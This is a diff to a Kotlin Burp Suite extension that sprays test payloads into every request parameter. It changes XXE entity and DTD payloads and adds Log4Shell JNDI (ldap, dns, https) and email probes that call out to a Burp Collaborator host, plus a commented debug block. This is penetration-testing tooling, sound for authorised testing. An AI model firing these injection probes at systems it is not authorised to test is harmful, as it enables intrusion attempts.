@@ -220,9 +220,9 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
         val collabGenerator = api.collaborator().defaultPayloadGenerator()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> %ext;]>\n",PayloadUpdateMode.PREPEND, "XML Entity OOB-Prepend")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> ]><test>&xxe</test>\n",PayloadUpdateMode.REPLACE, "XML Entity OOB-Replace")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\">\n",PayloadUpdateMode.PREPEND, "XML DTD OOB-Prepend")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> %ext;]>",PayloadUpdateMode.PREPEND, "XML Entity OOB-Prepend")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"https://${collabGenerator.generatePayload().toString()}/entity\"> ]><test>&xxe</test>",PayloadUpdateMode.REPLACE, "XML Entity OOB-Replace")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\">",PayloadUpdateMode.PREPEND, "XML DTD OOB-Prepend")
         iterateThroughParametersWithPayload(myHttpRequestResponses,"<!DOCTYPE asdfa PUBLIC \"-//B/A/EN\" \"https://${collabGenerator.generatePayload().toString()}/dtd\"><asdfa></asdfa>",PayloadUpdateMode.REPLACE, "XML DTD OOB-Replace")
         logger.debugLog("Exit")
     }
@@ -301,6 +301,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
         iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadUpdateMode.REPLACE, "Collab URL")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"test@${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}",PayloadUpdateMode.REPLACE, "Collab EMail")
         logger.debugLog("Exit")
     }
 
@@ -309,6 +310,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
         iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j ldap")
         iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j dns")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadUpdateMode.REPLACE, "log4j https")
         logger.debugLog("Exit")
     }
 
@@ -453,7 +455,21 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                                 "mutipart Param: ${parameter.name()}: $annotation"
                             )
 
-                        HttpParameterType.JSON ->
+                        HttpParameterType.JSON -> {
+                            /*api.logging().logToOutput("Name: ${parameter.name()}")
+                            api.logging().logToOutput("Name Start Index Inclusive: ${parameter.nameOffsets().startIndexInclusive()}")
+                            api.logging().logToOutput("Name End Index Exclusive: ${parameter.nameOffsets().endIndexExclusive()}")
+                            api.logging().logToOutput("Substring of Name: ${httpRequest.toString().substring(parameter.nameOffsets().startIndexInclusive(),parameter.nameOffsets().endIndexExclusive())}")
+                            api.logging().logToOutput("Value: ${parameter.value()}")
+                            api.logging().logToOutput("Value Start Index Inclusive: ${parameter.valueOffsets().startIndexInclusive()}")
+                            api.logging().logToOutput("Value End Index Exclusive: ${parameter.valueOffsets().endIndexExclusive()}")
+                            api.logging().logToOutput("Substring of Value: ${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive(),parameter.valueOffsets().endIndexExclusive())}")
+                            api.logging().logToOutput("Before Value: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}")
+                            api.logging().logToOutput("After Value: ${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive(),httpRequest.toString().length)}")
+                            api.logging().logToOutput("Prepend Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}PREPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().startIndexInclusive())}")
+                            api.logging().logToOutput("Append Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().endIndexExclusive())}APPEND!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")
+                            api.logging().logToOutput("Replace Test: ${httpRequest.toString().substring(0,parameter.valueOffsets().startIndexInclusive())}REPLACE!!!${httpRequest.toString().substring(parameter.valueOffsets().endIndexExclusive())}")*/
+                            
                             sendRequest(
                                 httpRequest.withUpdatedParsedParameterValue(
                                     parameter,
@@ -461,6 +477,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
                                     payloadType
                                 ), "URL JSON: ${parameter.name()}: $annotation"
                             )
+                        }
 
                         HttpParameterType.XML -> {
                             sendRequest(
@@ -550,3 +567,4 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
     }
 
 }
+
